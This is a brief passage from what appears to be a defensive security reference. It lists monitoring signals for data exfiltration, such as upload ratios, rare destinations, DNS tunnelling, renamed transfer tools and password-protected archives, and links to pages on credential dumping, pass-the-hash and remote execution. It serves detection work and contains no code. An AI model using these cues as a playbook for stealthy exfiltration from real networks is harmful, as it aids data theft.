    Monitor: **outbound deny logs**, especially from internal servers (early sign of someone probing for a way out); proxy and flow data for **upload volume, upload/download ratio, long-lived connections and regular timing**, per host over days; **new or rare destinations** and personal cloud-storage accounts; DNS for tunnelling patterns; and on endpoints, **renamed transfer tools** (`OriginalFileName` mismatches), archivers with password and volume options, and big internal copies into staging folders.

## Related references { #related }

- [Credential Dumping and Mimikatz](credential-dumping-mimikatz.md) — the step that fuels lateral movement · [Privilege Escalation](privilege-escalation.md)
- [PsExec over SMB](../../../adversary/psexec-smb.md) · [WMI and WinRM](../../../adversary/wmi-winrm.md) · [RDP](../../../adversary/rdp.md) · [Pass-the-Hash](../../../adversary/pass-the-hash.md)
- [SMB](../other-protocols/smb.md) · [SSH, RDP and VNC](../other-protocols/ssh-rdp-vnc.md) · [PowerShell remoting, FTP and ICMP](../other-protocols/psremoting-ftp-icmp.md) · [Remote tools](../other-protocols/remote-tools-summary.md) — the network side
- [DNS abuse](../dns/dns-abuse.md) — tunnelling and exfiltration over DNS
- [Windows event IDs](../../../basics/windows-event-ids.md)
